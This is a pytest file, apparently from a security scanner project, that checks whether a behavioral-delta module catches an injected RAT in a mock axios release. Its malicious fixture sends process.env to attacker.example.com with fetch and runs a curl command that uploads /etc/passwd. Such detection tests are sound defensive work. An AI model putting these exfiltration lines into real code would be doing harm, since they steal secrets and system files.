"""
Tests RF-06: behavioral_delta.py
Caso de referencia obligatorio: supply chain attack axios@1.14.1 (RAT inyectado).
Nuevos edges a red/proceso en v_nueva que no existían en v_anterior → BEHAVIORAL_ANOMALY.
"""
from pathlib import Path
import pytest
from secops.scanner.ast_engine import parse_file, ParseResult
from secops.scanner.behavioral_delta import analyze, build_call_graph

# ---------------------------------------------------------------------------
# Fixtures: axios 1.14.0 (limpio) vs 1.14.1 (supply chain attack)
# ---------------------------------------------------------------------------

AXIOS_1_14_0_CLEAN = """\
// axios 1.14.0 — versión limpia
function dispatchRequest(config) {
  var response = sendRequest(config);
  return response;
}
function sendRequest(config) {
  return buildFullPath(config.baseURL, config.url);
}
"""

# Supply chain: código malicioso inyectado — nueva función con callback a C2
AXIOS_1_14_1_MALICIOUS = """\
// axios 1.14.1 — versión con RAT inyectado
function dispatchRequest(config) {
  var response = sendRequest(config);
  exfiltrateData(process.env);
  return response;
}
function sendRequest(config) {
  return buildFullPath(config.baseURL, config.url);
}
// Código inyectado por atacante
function exfiltrateData(env) {
  fetch('https://attacker.example.com/collect', {
    method: 'POST',
    body: JSON.stringify(env)
  });
  child_process.exec('curl -d @/etc/passwd attacker.example.com');
}
"""

# Fix legítimo: cambio en lógica interna sin nuevas operaciones privilegiadas
AXIOS_1_7_9_BEFORE_FIX = """\
// axios 1.7.9 — antes del fix de allowAbsoluteUrls
function xhrAdapter(config) {
  var fullPath = buildFullPath(config.baseURL, config.url);
  request.open(config.method, fullPath);
}
"""

AXIOS_1_8_2_AFTER_FIX = """\
// axios 1.8.2 — después del fix
function xhrAdapter(config) {
  var url = config.allowAbsoluteUrls !== false
    ? config.url
    : buildFullPath(config.baseURL, config.url);
  request.open(config.method, url);
}
"""


def _parse(tmp_path: Path, filename: str, content: str) -> ParseResult:
    f = tmp_path / filename
    f.write_text(content)
    return parse_file(f, "javascript")


# ---------------------------------------------------------------------------
# Tests supply chain attack (RF-06 criterio de aceptación obligatorio)
# ---------------------------------------------------------------------------

class TestSupplyChainDetection:
    """axios 1.14.0 → 1.14.1: RAT inyectado debe generar BEHAVIORAL_ANOMALY CRITICAL/HIGH."""

    def test_supply_chain_detected_as_behavioral_anomaly(self, tmp_path):
        """RF-06: supply chain attack en axios@1.14.1 debe generar BEHAVIORAL_ANOMALY."""
        old = _parse(tmp_path, "axios_old.js", AXIOS_1_14_0_CLEAN)
        new = _parse(tmp_path, "axios_new.js", AXIOS_1_14_1_MALICIOUS)
        findings = analyze([old], [new], "axios", "1.14.0", "1.14.1")
        anomalies = [f for f in findings if f.finding_type == "BEHAVIORAL_ANOMALY" and f.severity != "INFO"]
        assert len(anomalies) >= 1, (
            "Supply chain attack axios@1.14.1 no detectado. "
            f"Hallazgos: {[f.title for f in findings]}"
        )

    def test_supply_chain_severity_is_critical_or_high(self, tmp_path):
        old = _parse(tmp_path, "axios_old.js", AXIOS_1_14_0_CLEAN)
        new = _parse(tmp_path, "axios_new.js", AXIOS_1_14_1_MALICIOUS)
        findings = analyze([old], [new], "axios", "1.14.0", "1.14.1")
        anomalies = [f for f in findings if f.finding_type == "BEHAVIORAL_ANOMALY" and f.severity != "INFO"]
        if anomalies:
            severities = {f.severity for f in anomalies}
            assert severities & {"CRITICAL", "HIGH"}, (
                f"Supply chain attack debería ser CRITICAL o HIGH. Severidades: {severities}"
            )

    def test_fetch_to_external_host_detected(self, tmp_path):
        """La llamada a fetch('attacker.example.com') debe ser edge nuevo privilegiado."""
        old = _parse(tmp_path, "old.js", AXIOS_1_14_0_CLEAN)
        new = _parse(tmp_path, "new.js", AXIOS_1_14_1_MALICIOUS)
        findings = analyze([old], [new], "axios", "1.14.0", "1.14.1")
        net_anomalies = [
            f for f in findings
            if f.finding_type == "BEHAVIORAL_ANOMALY"
            and any(k in f.description for k in ("fetch", "child_process", "exec", "red", "proceso"))
        ]
        assert len(net_anomalies) >= 1, (
            "No se detectó la llamada a red/proceso del RAT inyectado. "
            f"Hallazgos: {[f.description[:80] for f in findings]}"
        )


# ---------------------------------------------------------------------------
# Tests fix legítimo (RF-06 criterio de aceptación obligatorio)
# ---------------------------------------------------------------------------

class TestLegitimateFixNotFlaggedAsCritical:
    """axios 1.7.9 → 1.8.2: fix legítimo no debe ser BEHAVIORAL_ANOMALY CRITICAL."""

    def test_legitimate_fix_not_critical_anomaly(self, tmp_path):
        """RF-06: fix de CVE-2025-27152 no debe generar BEHAVIORAL_ANOMALY crítico."""
        old = _parse(tmp_path, "xhr_old.js", AXIOS_1_7_9_BEFORE_FIX)
        new = _parse(tmp_path, "xhr_new.js", AXIOS_1_8_2_AFTER_FIX)
        findings = analyze([old], [new], "axios", "1.7.9", "1.8.2")
        critical_anomalies = [
            f for f in findings
            if f.finding_type == "BEHAVIORAL_ANOMALY" and f.severity == "CRITICAL"
        ]
        assert len(critical_anomalies) == 0, (
            "Fix legítimo no debe generar BEHAVIORAL_ANOMALY CRITICAL. "
            f"Hallazgos CRITICAL: {[f.title for f in critical_anomalies]}"
        )


# ---------------------------------------------------------------------------
# Tests sin baseline
# ---------------------------------------------------------------------------

class TestNoBaseline:
    def test_no_baseline_returns_info_finding(self, tmp_path):
        """RF-06: sin versión anterior en caché → hallazgo INFO NO_BASELINE."""
        new = _parse(tmp_path, "new.js", AXIOS_1_14_0_CLEAN)
        findings = analyze(None, [new], "axios", None, "1.14.0")
        assert len(findings) == 1
        assert findings[0].severity == "INFO"
        assert "NO_BASELINE" in findings[0].title


# ---------------------------------------------------------------------------
# Tests de call graph
# ---------------------------------------------------------------------------

class TestCallGraph:
    def test_build_call_graph_detects_functions_and_calls(self, tmp_path):
        src = tmp_path / "test.js"
        src.write_text(
            "function foo() { bar(); baz(); }\n"
            "function bar() { return 1; }\n"
        )
        result = parse_file(src, "javascript")
        graph = build_call_graph([result])
        assert "foo" in graph.edges or "__module__" in graph.edges

    def test_no_third_party_tools_used(self):
        """RF-14: behavioral_delta no usa herramientas de terceros."""
        import secops.scanner.behavioral_delta as mod
        import inspect
        source = inspect.getsource(mod)
        for forbidden in ["import bandit", "import semgrep", "import safety", "import pip_audit"]:
            assert forbidden not in source
